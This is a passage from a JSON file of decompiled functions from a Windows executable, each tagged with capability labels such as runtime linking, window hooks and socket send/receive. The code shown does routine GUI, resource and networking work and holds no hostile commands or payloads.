(iVar3 == iVar5))\n        {\n            *param_2 = 0;\n        }\n        else {\n            *param_2 = iVar3;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar3, 0);\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 487
    },
    "00422de5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00422de5(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBX;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    for (; iVar2 != 0; iVar2 = fcn.0041f11d(iVar2)) {\n        iVar3 = (*pcVar1)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) {\n            return;\n        }\n    }\n    for (iVar2 = (*_sym.imp.USER32.dll_GetFocus)(); iVar2 != 0; iVar2 = fcn.0041f11d(iVar2)) {\n        iVar3 = (*pcVar1)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) {\n            return;\n        }\n    }\n    iVar2 = fcn.0041f162();\n    if (iVar2 == 0) {\n        uVar4 = 0;\n    }\n    else {\n        uVar4 = *(iVar2 + 0x1c);\n    }\n    iVar2 = (*_sym.imp.USER32.dll_GetLastActivePopup)(uVar4);\n    while( true ) {\n        if (iVar2 == 0) {\n            (*pcVar1)(*(unaff_EBX + 0x1c), 0x111, 0xe147, 0);\n            return;\n        }\n        iVar3 = (*pcVar1)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) break;\n        iVar2 = fcn.0041f11d(iVar2);\n    }\n    return;\n}\n",
        "token_count": 402
    },
    "00424390": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00424390(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *param_1;\n    if (iVar3 == 0) {\n        return 0;\n    }\n    if (iVar3 == param_2) {\n        *param_1 = *(param_1[1] + param_2);\n    }\n    else {\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar1 = param_1[1];\n        do {\n            iVar2 = *(iVar1 + iVar3);\n            if (iVar2 == param_2) break;\n            iVar3 = iVar2;\n        } while (iVar2 != 0);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        *(iVar1 + iVar3) = *(iVar1 + param_2);\n    }\n    return 1;\n}\n",
        "token_count": 221
    },
    "004245b3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004245b3(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 0x1c);\n    for (iVar2 = *(in_ECX + 0x14); iVar2 != 0; iVar2 = *(iVar2 + 4)) {\n        if (arg_8h < *(iVar2 + 8)) {\n            puVar3 = *(*(iVar2 + 0xc) + arg_8h * 4);\n            if (puVar3 != NULL) {\n                (***puVar3)(1);\n            }\n            *(*(iVar2 + 0xc) + arg_8h * 4) = 0;\n        }\n    }\n    puVar1 = *(in_ECX + 0x10) + arg_8h * 8;\n    *puVar1 = *puVar1 & 0xfffffffe;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 0x1c);\n    return;\n}\n",
        "token_count": 266
    },
    "0042716b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042716b(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.0042401d();\n    if (arg_ch == 0) {\n        fcn.0041ba49(arg_8h);\n        if (*(*(iVar1 + 0x30) + 0xc) == 0) {\n            piVar2 = fcn.0041db69(*(iVar1 + 0x2c));\n            (**(*piVar2 + 0x58))();\n            if (piVar2 != NULL) {\n                (**(*piVar2 + 4))(1);\n            }\n            *(iVar1 + 0x2c) = 0;\n            fcn.0041b8b8();\n            while (*(*(iVar1 + 0x38) + 0xc) != 0) {\n                uVar3 = fcn.0041b77c();\n                fcn.0041bd2d(uVar3);\n            }\n        }\n    }\n    else {\n        iVar1 = fcn.0041b9d7(arg_8h, &arg_ch);\n        if (iVar1 != 0) {\n            iVar1 = arg_ch + -1;\n            arg_ch = iVar1;\n            if (iVar1 == 0) {\n                fcn.0041ba49(arg_8h);\n            }\n            else {\n                piVar2 = fcn.0041b9f9(arg_8h);\n                *piVar2 = iVar1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00427a76": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00427a76(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00423ff7();\n    fcn.00424b3c(0);\n    for (iVar1 = *(iVar1 + 0x24); iVar1 != 0; iVar1 = *(iVar1 + 0x1c)) {\n        fcn.00427a55();\n    }\n    fcn.00424bac(0);\n    return;\n}\n",
        "token_count": 104
    },
    "00403cda": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nbool fcn.00403cda(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    if (*0x44d1c0 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((((iVar2 != 0) && (*0x44d1a8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x42a480),  *0x44d1a8 != 0))\n            && (*0x44d1ac = (*pcVar1)(iVar2, \"MonitorFromWindow\"),  *0x44d1ac != 0)) &&\n           (((*0x44d1b0 = (*pcVar1)(iVar2, \"MonitorFromRect\"),  *0x44d1b0 != 0 &&\n             (*0x44d1b4 = (*pcVar1)(iVar2, \"MonitorFromPoint\"),  *0x44d1b4 != 0)) &&\n            ((*0x44d1bc = (*pcVar1)(iVar2, \"EnumDisplayMonitors\"),  *0x44d1bc != 0 &&\n             (*0x44d1b8 = (*pcVar1)(iVar2, \"GetMonitorInfoA\"),  *0x44d1b8 != 0)))))) {\n            *0x44d1c0 = 1;\n            return true;\n        }\n        *0x44d1a8 = 0;\n        *0x44d1ac = 0;\n        *0x44d1b0 = 0;\n        *0x44d1b4 = 0;\n        *0x44d1b8 = 0;\n        *0x44d1bc = 0;\n        *0x44d1c0 = 1;\n        bVar3 = false;\n    }\n    else {\n        bVar3 = *0x44d1b8 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 466
    },
    "0041fe84": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint32_t fcn.0041fe84(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t unaff_ESI;\n    uint unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"COMCTL32.DLL\");\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"COMCTL32.DLL\");\n    uVar5 = uVar2;\n    if (uVar2 != 0) {\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, \"InitCommonControlsEx\");\n        uVar5 = 0;\n        if (pcVar3 == NULL) {\n            if ((unaff_ESI & 0x3fc0) == unaff_ESI) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = 0x3fc0;\n            }\n        }\n        else {\n            iVar4 = (*pcVar3)(unaff_EDI);\n            if ((iVar4 != 0) && (uVar5 = unaff_ESI,  iVar1 == 0)) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = unaff_ESI | 0x3fc0;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(uVar2);\n    }\n    return uVar5;\n}\n",
        "token_count": 333
    },
    "00416ab0": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00416ab0(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    *0x44dffc = param_2;\n    *0x44dff4 = param_1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *0x44dff8 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(4, 0x416a00, *0x44f3fc, uVar1);\n    return;\n}\n",
        "token_count": 114
    },
    "00423d56": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00423d56(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable._AFX_THREAD_STATE.0;\n    piVar1 = extraout_ECX[0x33];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x58))();\n        if (extraout_ECX[0x33] != NULL) {\n            (**(*extraout_ECX[0x33] + 4))(1);\n        }\n    }\n    pcVar2 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (extraout_ECX[0xc] != NULL) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(extraout_ECX[0xc]);\n    }\n    if (extraout_ECX[0xb] != NULL) {\n        (*pcVar2)(extraout_ECX[0xb]);\n    }\n    if (extraout_ECX[3] != NULL) {\n        fcn.0040b942(extraout_ECX[3]);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 374
    },
    "0041e4f1": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041e4f1(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x38) == NULL) {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(param_1 + 0x1c));\n        uVar2 = fcn.0041d5bd(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(*(param_1 + 0x1c), uVar2);\n        fcn.0041d595(0xffffffff);\n    }\n    else {\n        (**(**(param_1 + 0x38) + 0x88))(param_2);\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "0041fb67": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint fcn.0041fb67(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    if (param_1 != 0) {\n        iVar2 = fcn.00423ff7();\n        uVar1 = *(iVar2 + 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar1, param_1, 0xf0);\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar1, iVar2);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar2);\n        }\n    }\n    uVar3 = fcn.0041fbb7(uVar3);\n    return uVar3;\n}\n",
        "token_count": 207
    },
    "00426ff4": {
        "rules": [
            "receive data on socket",
            "receive data"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00426ff4(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    sub.WSOCK32.dll_recv(*(param_1 + 4), param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 67
    },
    "0042700b": {
        "rules": [
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042700b(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    sub.WSOCK32.dll_send(*(param_1 + 4), param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 67
    }
}